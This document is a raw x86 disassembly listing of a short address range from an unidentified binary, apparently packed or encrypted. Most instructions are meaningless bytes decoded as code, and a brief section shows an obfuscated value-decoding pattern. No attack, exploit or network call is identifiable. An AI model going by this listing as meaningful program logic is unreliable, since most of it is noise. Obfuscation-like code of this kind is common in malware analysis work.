  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	pop    esi
  4028cf:	mov    ah,0xd3
  4028d1:	div    edx
  4028d3:	pause  
  4028d5:	adc    al,0xbb
  4028d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028d8:	cmp    eax,esi
  4028da:	pop    eax
  4028db:	mov    ss,eax
  4028dd:	popa   
  4028de:	les    edx,FWORD PTR es:[ecx-0x2e]
  4028e2:	retf   
  4028e3:	mov    eax,DWORD PTR [esi]
  4028e5:	pop    ecx
  4028e6:	les    ebp,FWORD PTR [ecx]
  4028e8:	sbb    BYTE PTR [edx],ah
  4028ea:	push   fs
  4028ec:	pop    es
  4028ed:	cmp    BYTE PTR [ecx+esi*8+0x4d],bh
  4028f1:	adc    ah,BYTE PTR [ebx]
  4028f3:	push   ebp
  4028f4:	sub    al,0xeb
  4028f7:	or     eax,0x292b0a9d
  4028fc:	mov    ebp,0xd31dbeaa
  402901:	inc    eax
  402902:	retf   
  402903:	xor    ecx,DWORD PTR [edi-0x68]
  402906:	mov    dh,dl
  402908:	xlat   BYTE PTR ds:[ebx]
  402909:	mov    cs,WORD PTR [ebx]
  40290b:	test   ecx,esi
  40290d:	out    0xd8,eax
  40290f:	(bad)  
  402910:	aad    0x57
  402912:	or     al,cl
  402914:	mov    eax,DWORD PTR [eax+ecx*1-0x304ae624]
  40291b:	sbb    BYTE PTR [ebx+0x48],ch
  40291e:	jp     0x4028ea
  402920:	or     al,0x38
  402922:	mov    al,ds:0xef5fddea
  402927:	xor    ah,BYTE PTR [esi]
  402929:	sbb    DWORD PTR [ebx],ebx
  40292b:	mov    BYTE PTR [ebp-0x39],ch
  40292e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40292f:	rcr    DWORD PTR [ebx],1
  402931:	xor    al,0x32
  402933:	fisttp WORD PTR [esi-0x6b916238]
  402939:	repnz out dx,eax
  40293b:	in     eax,0x1c
  40293d:	push   esp
  40293e:	shr    BYTE PTR [edi-0x1f],cl
  402941:	out    dx,al
  402942:	cdq    
  402943:	fmul   DWORD PTR [ebx+0x5]
  402946:	dec    ecx
  402947:	push   ebp
  402948:	lods   al,BYTE PTR ds:[esi]
  402949:	jno    0x402980
  40294b:	ja     0x4029c4
  40294d:	shl    DWORD PTR [edx-0x67],1
  402950:	sbb    BYTE PTR [edx-0x43],dl
  402953:	push   ss
  402954:	mov    dl,0x9b
  402956:	mov    ds:0x3c495d20,eax
  40295b:	pop    edi
  40295c:	and    eax,0x9dd5a9ec
  402961:	adc    eax,0x7d3a2104
  402966:	out    0x65,eax
  402968:	cli    
  402969:	sbb    bh,BYTE PTR [ecx]
  40296b:	mov    BYTE PTR [ecx-0x6d772154],0xf3
  402972:	push   ebp
  402973:	mov    WORD PTR [edx+0xc],?
  402976:	in     eax,dx
  402977:	push   0x35
  402979:	mov    ch,BYTE PTR [ecx-0x55]
  40297c:	push   eax
  40297d:	or     BYTE PTR [esi+0x20],ah
  402980:	ss in  al,0xba
  402983:	mov    bl,0xd3
  402985:	xchg   ebp,eax
  402986:	sub    al,0x64
  402988:	sub    ecx,edx
  40298a:	pop    esp
  40298b:	mov    ebx,0xee1a994c
  402990:	or     DWORD PTR [edx-0x10],esp
  402993:	xor    ah,BYTE PTR [edi]
  402995:	lock mov es,WORD PTR [edx]
  402998:	mov    al,ds:0x9a582539
  40299d:	aad    0x5e
  40299f:	adc    DWORD PTR [ebx+edx*8+0x58],ecx
  4029a3:	cmp    al,0x47
  4029a5:	fucom  st(7)
  4029a7:	outs   dx,BYTE PTR ds:[esi]
  4029a8:	repz in al,dx
  4029aa:	mov    ebx,DWORD PTR [esi+0x47]
  4029ad:	push   edi
  4029ae:	pop    edx
  4029af:	int3   
  4029b0:	jo     0x402959
  4029b2:	push   0x2d
  4029b4:	xchg   edx,eax
  4029b5:	cmp    ecx,edi
  4029b7:	fdivr  DWORD PTR [eax+ebp*4]
  4029ba:	aas    
  4029bb:	sub    al,0x29
  4029bd:	sub    ch,BYTE PTR [ecx+0x2b]
  4029c0:	push   eax
  4029c1:	adc    eax,esp
  4029c3:	and    eax,0x66fa4ce4
  4029c8:	ins    BYTE PTR es:[edi],dx
  4029c9:	gs add al,0xce
  4029cc:	mov    bh,0x72
  4029ce:	aad    0xa7
  4029d0:	xor    eax,0xaad007ba
  4029d5:	mov    esi,0x20e988a1
  4029da:	rcr    DWORD PTR [esi],cl
  4029dc:	jg     0x402a3c
  4029de:	push   esp
  4029df:	or     al,0x56
  4029e1:	pop    es
  4029e2:	div    ah
  4029e4:	mov    ecx,0x849732b0
  4029e9:	rcr    DWORD PTR [edx-0x59],1
  4029ec:	ss js  0x4029fd
  4029ef:	pop    edx
  4029f0:	aam    0x50
  4029f2:	jns    0x402a4c
  4029f4:	or     ecx,DWORD PTR [ecx]
  4029f6:	fild   DWORD PTR es:[ecx+0x77501537]
  4029fd:	shl    edx,1
  4029ff:	out    dx,al
  402a00:	jp     0x402a03
  402a02:	out    dx,eax
  402a03:	int3   
  402a04:	jg     0x402a29
  402a06:	mov    BYTE PTR [ecx+0x60515811],dl
  402a0c:	(bad)  
  402a0d:	cli    
  402a0e:	fsubr  st,st(4)
  402a10:	nop
  402a11:	or     DWORD PTR [edx-0x3f],eax
  402a14:	in     eax,0x56
  402a16:	call   0x6ce7:0x2d0864a6
  402a1d:	pop    esp
  402a1e:	fcom   QWORD PTR es:[ebp+0x32]
  402a22:	rcl    BYTE PTR [eax],1
  402a24:	inc    esi
  402a25:	sahf   
  402a26:	popa   
  402a27:	aad    0x4f
  402a29:	mov    gs,WORD PTR [esi]
  402a2b:	add    al,0xc6
  402a2d:	inc    ecx
  402a2e:	mov    ss,WORD PTR [ebp-0x5306455c]
  402a34:	or     eax,0xbf4a7c2
  402a39:	in     eax,0x3d
  402a3b:	mov    edi,esi
  402a3d:	sbb    al,al
  402a3f:	or     BYTE PTR [eax+0x6b40d63f],0x4e
  402a46:	loopne 0x4029ce
  402a48:	inc    eax
  402a49:	jne    0x402ac0
  402a4b:	(bad)  
  402a4d:	sbb    cl,BYTE PTR [ecx-0x7a]
  402a50:	mov    esp,0x4f4216a8
  402a55:	lahf   
  402a56:	lods   eax,DWORD PTR ds:[esi]
  402a57:	ret    
  402a58:	or     eax,0x171ada5d
  402a5d:	cli    
  402a5e:	out    dx,al
  402a5f:	pop    eax
  402a60:	inc    edx
  402a61:	sbb    BYTE PTR [eax],ch
  402a63:	pusha  
  402a64:	outs   dx,BYTE PTR ds:[esi]
  402a65:	test   DWORD PTR [esi],eax
  402a67:	inc    ecx
  402a68:	ror    bl,cl
  402a6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a6b:	cmp    esp,DWORD PTR [ebp+0x43]
  402a6e:	test   al,0xb7
  402a70:	sbb    esp,DWORD PTR ds:0x2813e860
  402a76:	cld    
  402a77:	push   eax
  402a78:	push   ebp
  402a79:	fidiv  WORD PTR [eax]
  402a7b:	xor    dl,BYTE PTR [ebx]
  402a7d:	jne    0x402a42
  402a7f:	xor    BYTE PTR [edx],0x58
  402a82:	ds lock jg 0x402a3d
  402a86:	test   al,0xe0
  402a88:	jns    0x35c3a5e5
  402a8e:	and    eax,0x3a1c2186
  402a93:	dec    ebx
  402a94:	iret   
  402a95:	fcom   DWORD PTR [ebx+0x289669ca]
  402a9b:	rcl    DWORD PTR [eax-0x57],0x14
  402a9f:	js     0x402a83
  402aa1:	enter  0x46fc,0xbe
  402aa5:	push   eax
  402aa6:	sub    esp,DWORD PTR [esi+0x16555abf]
  402aac:	cmp    dl,dh
  402aae:	or     BYTE PTR [edi-0x3a149369],cl
  402ab4:	add    BYTE PTR [esi+0xea4c72a],bh
  402aba:	jp     0x402a8d
  402abc:	and    BYTE PTR [ecx-0x12],bl
  402abf:	test   BYTE PTR [ebx+0x433298c4],bl
  402ac5:	mov    al,ds:0xf004dc69
  402aca:	mov    edi,DWORD PTR [edi+0x554ae0c3]
  402ad0:	mov    ebx,0x735a4d4c
  402ad5:	dec    ebp
  402ad6:	push   0xae55a969
  402adb:	and    dl,0x5f
  402ade:	xlat   BYTE PTR ds:[ebx]
  402adf:	jnp    0x402ac0
  402ae1:	jne    0x402b0d
  402ae3:	stos   BYTE PTR es:[edi],al
  402ae4:	add    al,0xc4
  402ae6:	sbb    ebx,DWORD PTR [ebx-0x72]
  402ae9:	cmp    BYTE PTR [edx],ch
  402aeb:	mov    ah,0xb6
  402aed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aee:	leave  
  402aef:	add    esi,DWORD PTR [ebp+0x7d]
  402af2:	push   cs
  402af3:	sub    cl,BYTE PTR [edi+0x52e25f45]
  402af9:	dec    esi
  402afa:	repnz repz push ebp
  402afd:	sub    DWORD PTR [esi-0x5a],esp
  402b00:	fnstcw WORD PTR [esi-0x3e3a4255]
  402b06:	mov    ah,0x42
  402b08:	mov    cl,0xec
  402b0a:	push   esi
  402b0b:	push   0xffffffa9
  402b0d:	mov    bl,0x1e
  402b0f:	cmc    
  402b10:	jno    0x402adb
  402b12:	push   ds
  402b13:	leave  
  402b14:	fs fwait
  402b16:	pusha  
  402b17:	mov    ebx,0xcac14c69
  402b1c:	out    dx,al
  402b1d:	push   edi
  402b1e:	lods   eax,DWORD PTR ds:[esi]
  402b1f:	push   ds
  402b20:	test   eax,0xae7223d5
  402b25:	std    
  402b26:	js     0x402b01
  402b28:	and    bl,bh
  402b2a:	xchg   DWORD PTR [ebx],ecx
  402b2c:	xor    ch,BYTE PTR [edx-0x51]
  402b2f:	sub    DWORD PTR [ebp-0xf],esi
  402b32:	(bad)  
  402b33:	mov    ebx,0x8cefad44
  402b38:	fs popf 
  402b3a:	out    0xcb,al
  402b3c:	push   ss
  402b3d:	ds stos DWORD PTR es:[edi],eax
  402b3f:	inc    edx
  402b40:	je     0x402b4d
  402b42:	dec    ebx
  402b43:	push   esi
  402b44:	sti    
  402b45:	mov    ch,0xd8
  402b47:	mov    BYTE PTR [edx+0x27c80f2a],dh
  402b4d:	add    al,0xf0
  402b4f:	xchg   edi,eax
  402b50:	push   esi
  402b51:	outs   dx,BYTE PTR ds:[esi]
  402b52:	dec    edi
  402b53:	ins    DWORD PTR es:[edi],dx
  402b54:	add    bl,BYTE PTR [ebp-0x573c0f3a]
  402b5a:	loopne 0x402b0d
  402b5c:	push   ebp
  402b5d:	mov    al,ss:0x4b0c0b00
  402b63:	jmp    0xc9c0fbd2
  402b68:	xchg   esp,eax
  402b69:	ds mov al,0xd8
  402b6c:	leave  
  402b6d:	repz cmp BYTE PTR [ecx-0x1130e56],ah
  402b74:	in     eax,dx
  402b75:	inc    esp
  402b76:	cdq    
  402b77:	pop    ss
  402b78:	and    edi,esi
  402b7a:	shr    DWORD PTR [ecx],cl
  402b7c:	daa    
  402b7d:	mov    cl,dh
  402b7f:	xor    DWORD PTR [edx-0x6488d07b],esp
  402b85:	mov    al,0x7e
  402b87:	and    BYTE PTR [eax+0x41],ah
  402b8a:	(bad)  
  402b8b:	clc    
  402b8c:	sub    ch,BYTE PTR [edi+0x783ea2]
  402b92:	jl     0x402b25
  402b94:	pop    eax
  402b95:	daa    
  402b96:	std    
  402b97:	jg     0x402bf4
  402b99:	jb     0x402bd1
  402b9b:	adc    al,0x6c
  402b9d:	or     al,0x5e
  402b9f:	ins    DWORD PTR es:[edi],dx
  402ba0:	add    BYTE PTR [edx+0x19],dl
  402ba3:	bound  ebx,QWORD PTR [ebx]
  402ba5:	test   BYTE PTR [edx],dh
  402ba7:	(bad)  
  402ba8:	add    ecx,DWORD PTR [esi+0x2c]
  402bab:	sahf   
  402bac:	sar    al,1
  402bae:	xchg   ebp,eax
  402baf:	shr    BYTE PTR [edx+eiz*4-0x73],0xe5
  402bb4:	or     bh,BYTE PTR [esi+0x6e2d5029]
  402bba:	sbb    cl,BYTE PTR [edi]
  402bbc:	aas    
  402bbd:	xor    bl,BYTE PTR [eax-0x7230812f]
  402bc3:	fs inc dx
  402bc6:	bound  esi,QWORD PTR [ebx+0x61711848]
  402bcc:	jmp    0xe75b:0x89711919
  402bd3:	imul   ecx,DWORD PTR [eax-0x42],0x1
  402bd7:	pop    ds
  402bd8:	sbb    BYTE PTR [ebp+0x2f],bl
  402bdb:	jae    0x402bb9
  402bdd:	jns    0x402c1d
  402bdf:	pop    eax
  402be0:	imul   ebp,DWORD PTR [ecx-0x34cc69a2],0xfcce2972
  402bea:	fidivr WORD PTR [ecx+0x14f145ce]
  402bf0:	add    ebx,DWORD PTR [ecx-0xa]
  402bf3:	dec    esp
  402bf4:	push   ecx
  402bf5:	sub    al,0x4c
  402bf7:	inc    esi
  402bf8:	xchg   ebp,eax
  402bf9:	neg    BYTE PTR [edx]
  402bfb:	pop    ss
  402bfc:	out    dx,al
  402bfd:	jecxz  0x402c43
  402bff:	jmp    0x42e56b54
  402c04:	jno    0x402c33
  402c06:	adc    ecx,DWORD PTR [ebp-0x4b8c5d16]
  402c0c:	and    eax,0x708bda2e
  402c11:	push   cs
  402c12:	pop    esp
  402c13:	sahf   
  402c14:	push   ebp
  402c15:	mov    al,ds:0x98dbc9ab
  402c1a:	bound  edx,QWORD PTR [ecx-0x31]
  402c1d:	xchg   edi,eax
  402c1e:	fdivr  st,st(6)
  402c20:	cmp    DWORD PTR [edi+0x8f51429],edx
  402c26:	jmp    0x660f:0x7b40824a
  402c2d:	sub    eax,0x6097bf7e
  402c32:	mov    bl,0xd3
  402c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c35:	pop    esp
  402c36:	aam    0x2c
  402c38:	adc    ecx,DWORD PTR [ecx+0x70cda07]
  402c3e:	mov    al,ds:0x69d6be1d
  402c43:	mov    eax,ds:0xf0b5aa19
  402c48:	adc    al,0xef
  402c4a:	or     DWORD PTR [ebx+0x41b60150],esp
  402c50:	sub    esi,esi
  402c52:	mov    bl,0x5f
  402c54:	jbe    0x402cd2
  402c56:	(bad)  
  402c57:	js     0x402c11
  402c59:	into   
  402c5a:	nop
  402c5b:	out    dx,al
  402c5c:	xchg   edi,eax
  402c5d:	and    ecx,DWORD PTR [ecx-0x62]
  402c60:	mov    ch,0x76
  402c62:	sahf   
  402c63:	addr16 sbb eax,0x3e568464
  402c69:	cli    
  402c6a:	inc    esp
  402c6b:	dec    edi
  402c6c:	in     eax,0xe4
  402c6e:	lock add al,0xc9
  402c71:	hlt    
  402c72:	popf   
  402c73:	outs   dx,DWORD PTR ds:[esi]
  402c74:	jns    0x402cb1
  402c76:	and    ch,dl
  402c78:	jo     0x402c25
  402c7a:	jmp    0x402c3d
  402c7c:	xor    eax,0x8ea2290f
  402c81:	outs   dx,BYTE PTR ds:[esi]
  402c82:	mov    ebx,0xbcf8e3f8
  402c87:	rol    BYTE PTR [ebp+0x15a8b17b],cl
  402c8d:	push   es
  402c8e:	mov    ah,0xcd
  402c90:	push   cs
  402c91:	adc    dl,BYTE PTR [ecx+0x77]
  402c94:	hlt    
  402c95:	push   cs
  402c96:	push   ss
  402c97:	sbb    eax,0xdfa3dd4e
  402c9c:	imul   edi,DWORD PTR [ecx+esi*4-0x17c22e74],0x6c
  402ca4:	repz sbb eax,0xc0ed67bf
  402caa:	xor    dl,BYTE PTR [ebx-0x40]
  402cad:	int    0x4b
  402caf:	adc    al,0x7b
  402cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cb2:	adc    bl,BYTE PTR [edi]
  402cb4:	mov    cl,0x39
  402cb6:	mov    edi,0x984a9dc9
  402cbb:	pusha  
  402cbc:	in     al,0xdc
  402cbe:	ret    0xaa05
  402cc1:	add    BYTE PTR [eax],al
  402cc3:	add    BYTE PTR [eax-0x75],dl
  402cc6:	inc    ebp
  402cc7:	call   0x1d8ad57
  402ccc:	add    BYTE PTR [eax],al
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	fs popa 
  402d3f:	xor    al,0x32
  402d41:	adc    eax,0x7e7e0998
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	jge    0x402dc7
  402d49:	jle    0x402dc1
  402d4b:	call   0x9dd3:0xa692aacf
  402d52:	imul   esp,DWORD PTR [ebx-0x61e25a90],0x3bfe7901
  402d5c:	addr16 aaa 
  402d5e:	(bad)  
  402d5f:	imul   ecx,DWORD PTR [edi],0x11
  402d62:	pop    esi
  402d63:	add    cl,BYTE PTR [esi+0x3b505e25]
  402d69:	dec    edx
  402d6a:	fisub  DWORD PTR [ebp+0x4c]
  402d6d:	mov    edi,DWORD PTR [esi]
  402d6f:	sbb    DWORD PTR [ebp+ebp*8+0x5e6bfc46],ecx
  402d76:	mov    esi,0x83680f16
  402d7b:	push   edx
  402d7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d7d:	mov    esi,0xad4db9c6
  402d82:	into   
  402d83:	adc    eax,0xe78fec6f
  402d88:	mov    edx,0x400120b0
  402d8d:	out    0x25,al
  402d8f:	jmp    0x402dda
  402d91:	scas   eax,DWORD PTR es:[edi]
  402d92:	sub    esi,edi
  402d94:	add    al,0xd8
  402d96:	sbb    eax,0x982f2cd2
  402d9b:	outs   dx,DWORD PTR ds:[esi]
  402d9c:	xchg   ecx,eax
  402d9d:	xchg   DWORD PTR [ebx-0x4d9a4db8],edi
  402da3:	test   al,0xe
  402da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402da6:	out    0x6a,al
  402da8:	repz and eax,0x5c39ded4
  402dae:	push   eax
  402daf:	pop    ecx
  402db0:	loop   0x402e1b
  402db2:	cmp    DWORD PTR [eax],0x94b63471
  402db8:	cmp    eax,0x164eed17
  402dbd:	adc    al,BYTE PTR [esi+0x58]
  402dc0:	mov    esi,0x27366bf0
  402dc5:	lea    ebx,cs:[ebp+0xe]
  402dc9:	jg     0x402db4
  402dcb:	int3   
  402dcc:	cld    
  402dcd:	fbld   TBYTE PTR [eax-0x671c4d8e]
  402dd3:	aas    
  402dd4:	ret    
  402dd5:	pop    eax
  402dd6:	mov    ebp,0x67f0400e
  402ddb:	je     0x402de9
  402ddd:	in     al,dx
  402dde:	gs ret 0x9642
  402de2:	je     0x402e3c
  402de4:	(bad)  
  402de5:	loope  0x402dfb
  402de7:	or     esp,edx
  402de9:	xchg   edx,eax
  402dea:	mov    dl,0xee
  402dec:	xchg   ebx,eax
  402ded:	xchg   DWORD PTR [eax],ebp
  402def:	cld    
  402df0:	add    eax,0xb1422e75
  402df5:	dec    ebx
  402df6:	leave  
  402df7:	sub    edi,DWORD PTR [edx+0x37]
  402dfa:	mov    bl,0x89
  402dfc:	and    DWORD PTR [edx-0x14],0x6d
  402e00:	mov    ebp,0x1cae8946
  402e05:	sub    DWORD PTR [eax-0x1c542188],ebx
  402e0b:	sbb    eax,0x238b050c
  402e10:	ficomp DWORD PTR [edx]
  402e12:	int    0x26
  402e14:	inc    esi
  402e15:	fild   WORD PTR [ecx]
  402e17:	in     al,0xde
  402e19:	cld    
  402e1a:	neg    BYTE PTR [edi+0x79]
  402e1d:	fs dec ebx
  402e1f:	dec    esp
  402e20:	sub    al,0x39
  402e22:	xchg   eax,esp
  402e24:	in     al,0xad
  402e26:	in     eax,dx
  402e27:	inc    edi
  402e28:	fdivr  DWORD PTR [eax-0x462188d3]
  402e2e:	push   edi
  402e2f:	ror    BYTE PTR [esi-0x2e],0x32
  402e33:	ins    BYTE PTR es:[edi],dx
  402e34:	loop   0x402e15
  402e36:	dec    esi
  402e37:	mov    ch,0x9b
  402e39:	inc    ebx
  402e3a:	mov    ss,WORD PTR [ecx+0x79]
  402e3d:	sub    DWORD PTR [edx+0x5fa50cd4],edx
  402e43:	sub    esp,DWORD PTR [ebp-0x38]
  402e46:	xchg   edi,eax
  402e47:	inc    edi
  402e48:	sbb    eax,0x327709de
  402e4d:	stc    
  402e4e:	or     DWORD PTR [ebx],ebx
  402e50:	cli    
  402e51:	mov    al,0x9c
  402e53:	and    DWORD PTR [ebx+0x27],ecx
  402e56:	lock dec ebx
  402e58:	cs ds push ebp
  402e5b:	dec    ecx
  402e5c:	jge    0x402e0b
  402e5e:	mov    cl,BYTE PTR [ebp+edi*1-0x3e]
  402e62:	mov    ebp,DWORD PTR [esi-0x7f]
  402e65:	jb     0x402e8d
  402e67:	sub    eax,0x7509e83c
  402e6c:	jns    0x402e65
  402e6e:	cmovle esp,DWORD PTR [eax+edi*4]
  402e72:	pop    ss
  402e73:	mov    ah,0xb0
  402e75:	jb     0x402eca
  402e77:	sahf   
  402e78:	ds (bad) 
  402e7a:	pop    eax
  402e7b:	scas   al,BYTE PTR es:[edi]
  402e7c:	cmp    al,0xd6
  402e7e:	fisttp DWORD PTR [esi]
  402e80:	push   edi
  402e81:	(bad)  
  402e83:	push   ds
  402e84:	fsubr  QWORD PTR [ebp+0x69]
  402e87:	mov    esp,DWORD PTR [ebx]
  402e89:	and    DWORD PTR [eax-0x670b0eb2],eax
  402e8f:	cmp    eax,0x5ce5c976
  402e94:	sub    edi,DWORD PTR [esi-0x2866898]
  402e9a:	and    dh,BYTE PTR [esi-0x27396437]
  402ea0:	shr    DWORD PTR [ebx-0x47dc4ef],0x76
  402ea7:	jmp    0x402e6a
  402ea9:	mov    ds:0xe7b40e87,al
  402eae:	sti    
  402eaf:	mov    BYTE PTR [eax-0x26],dl
  402eb2:	mov    esi,0xcdeb254e
  402eb7:	jo     0x402ea2
  402eb9:	hlt    
  402eba:	outs   dx,DWORD PTR es:[esi]
  402ebc:	shl    BYTE PTR [edx],1
  402ebe:	clc    
  402ebf:	inc    ebx
  402ec0:	popf   
  402ec1:	xor    cl,BYTE PTR [edi-0x4b]
  402ec4:	ins    DWORD PTR es:[edi],dx
  402ec5:	fs pushf 
  402ec7:	fidiv  WORD PTR [edx+edi*1]
  402eca:	mov    DWORD PTR [ebp-0x36],ebx
  402ecd:	push   edi
  402ece:	js     0x402edf
  402ed0:	sbb    eax,0xba7dce2a
  402ed5:	inc    esi
  402ed6:	ins    DWORD PTR es:[edi],dx
  402ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ed8:	sub    edx,DWORD PTR [edx-0x6]
  402edb:	retf   0x65c9
  402ede:	ds dec ebp
  402ee0:	out    dx,al
  402ee1:	push   0x35f744ef
  402ee6:	inc    ebx
  402ee7:	dec    eax
  402ee8:	mov    ebp,0xfcc27323
  402eed:	dec    eax
  402eee:	xor    cl,bh
  402ef0:	(bad)  
  402ef1:	cmp    dl,BYTE PTR [edi-0x2f]
  402ef4:	out    0x9d,al
  402ef6:	test   BYTE PTR [ebx+0x6f],dl
  402ef9:	add    BYTE PTR [eax],0xdf
  402efc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402efd:	sub    DWORD PTR [ebx-0x16a0ea65],edx
  402f03:	outs   dx,BYTE PTR ds:[esi]
  402f04:	jmp    eax
  402f06:	and    DWORD PTR [edi-0xc],ecx
  402f09:	ins    BYTE PTR es:[edi],dx
  402f0a:	enter  0xc99d,0x16
  402f0e:	rcl    DWORD PTR [esi],cl
  402f10:	push   es
  402f11:	xor    esp,DWORD PTR [ebx]
  402f13:	std    
  402f14:	sub    al,0xc1
  402f16:	inc    edx
  402f17:	loop   0x402ecd
  402f19:	mov    ecx,0x1070ca25
  402f1e:	rol    BYTE PTR [eax],0x56
  402f21:	aad    0x76
  402f23:	out    0x2f,al
  402f25:	xor    DWORD PTR [edi],ebx
  402f27:	outs   dx,DWORD PTR ds:[esi]
  402f28:	cmp    ah,dl
  402f2a:	clc    
  402f2b:	jno    0x402eb7
  402f2d:	outs   dx,DWORD PTR ds:[esi]
  402f2e:	ss retf 0x7271
  402f32:	xor    BYTE PTR [ebp-0x5d8968d3],0x40
  402f39:	and    eax,0x331cf6bf
  402f3e:	xor    esp,DWORD PTR [edx]
  402f40:	push   edi
  402f41:	in     al,0x21
  402f43:	dec    BYTE PTR [ecx]
  402f45:	cmp    dh,BYTE PTR [esi+0x2567723e]
  402f4b:	mov    edi,0x9a93d6ee
  402f50:	imul   ebx,ecx,0xd2dcc2e1
  402f56:	or     eax,0xc1f622d5
  402f5b:	dec    eax
  402f5c:	je     0x402f93
  402f5e:	jo     0x402f09
  402f60:	inc    eax
  402f61:	mov    ah,0x2f
  402f63:	js     0x402f21
  402f65:	pop    ds
  402f66:	enter  0x22c2,0xbf
  402f6a:	scas   al,BYTE PTR es:[edi]
  402f6b:	sub    eax,0x3c073b29
  402f70:	loope  0x402f40
  402f72:	out    dx,eax
  402f73:	dec    esi
  402f74:	cwde   
  402f75:	push   es
  402f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f77:	and    edx,DWORD PTR [edi]
  402f79:	sbb    eax,DWORD PTR [edx-0x4b]
  402f7c:	outs   dx,DWORD PTR ds:[esi]
  402f7d:	xor    BYTE PTR [ecx-0x77],0x96
  402f81:	or     ch,BYTE PTR [edi-0x64]
  402f84:	jo     0x402fad
  402f86:	and    al,0xf
  402f88:	fcomip st,st(3)
  402f8a:	pop    esp
  402f8b:	or     BYTE PTR [edi+0x13877d47],ah
  402f91:	sbb    DWORD PTR [eax],esp
  402f93:	sbb    BYTE PTR [ecx+0x4c2ae98e],ah
  402f99:	nop
  402f9a:	js     0x402f41
  402f9c:	xor    BYTE PTR [esi-0x72],0x77
  402fa0:	repnz sbb esp,ebp
  402fa3:	es sub al,0x2
  402fa6:	sbb    DWORD PTR [ebp+esi*1+0x13ca0f73],ecx
  402fad:	into   
  402fae:	xchg   edx,eax
  402faf:	sub    BYTE PTR [esi-0x6ff5ed3d],bh
  402fb5:	pop    eax
  402fb6:	cld    
  402fb7:	xor    eax,0xf2c641c5
  402fbc:	repnz stos DWORD PTR es:[edi],eax
  402fbe:	or     esp,0xffffff9a
  402fc1:	add    BYTE PTR ds:0x7483c53a,ah
  402fc7:	repnz cwde 
  402fc9:	(bad)  
  402fca:	stc    
  402fcb:	sar    BYTE PTR [eax],0x2
  402fce:	inc    esp
  402fcf:	bound  edx,QWORD PTR [ecx+0x5]
  402fd2:	out    0xca,eax
  402fd4:	nop
  402fd5:	xor    DWORD PTR [eax-0x74dd9813],ebp
  402fdb:	je     0x403028
  402fdd:	xor    DWORD PTR [ecx+0x12],0x2b
  402fe1:	outs   dx,BYTE PTR ds:[esi]
  402fe2:	or     bl,al
  402fe4:	in     al,0xca
  402fe6:	in     al,dx
  402fe7:	sbb    ch,dh
  402fe9:	mov    WORD PTR [edx-0x71],cs
  402fec:	jb     0x402f8b
  402fee:	inc    eax
  402fef:	stos   BYTE PTR es:[edi],al
  402ff0:	idiv   BYTE PTR ds:0x1a3f4e0f
  402ff6:	mov    DWORD PTR [ebx+edx*2],0x9b11d4d4
  402ffd:	xor    dl,BYTE PTR ds:0xf2f671fa
  403003:	out    dx,eax
  403004:	jecxz  0x402fd1
  403006:	mov    esi,0x760439a8
  40300b:	push   ds
  40300c:	xchg   ebp,eax
  40300d:	in     al,0xf
  40300f:	jecxz  0x403036
  403011:	or     DWORD PTR ds:0xf9cdb0fb,edx
  403017:	or     al,0x8d
  403019:	jmp    0x585db9ee
  40301e:	in     al,dx
  40301f:	xor    edi,ebp
  403021:	lods   al,BYTE PTR ds:[esi]
  403022:	mov    cl,BYTE PTR [edx]
  403024:	jns    0x402fe1
  403026:	test   DWORD PTR [esi-0x17],ebx
  403029:	and    eax,0x99e04933
  40302e:	int    0x37
  403030:	icebp  
  403031:	or     eax,0xc792d9d2
  403036:	stos   BYTE PTR es:[edi],al
  403037:	lods   al,BYTE PTR ds:[esi]
  403038:	adc    ch,dl
  40303a:	mov    ecx,0xc06cfc67
  40303f:	lahf   
  403040:	dec    eax
  403041:	inc    edi
  403042:	mov    ds:0x9dae6492,eax
  403047:	push   cs
  403048:	loop   0x4030bd
  40304a:	sbb    al,BYTE PTR [ebx+0x26]
  40304d:	les    edi,FWORD PTR [esp+eax*1]
  403050:	cmp    DWORD PTR [edx+edx*8-0x41],esp
  403054:	jno    0x4030b2
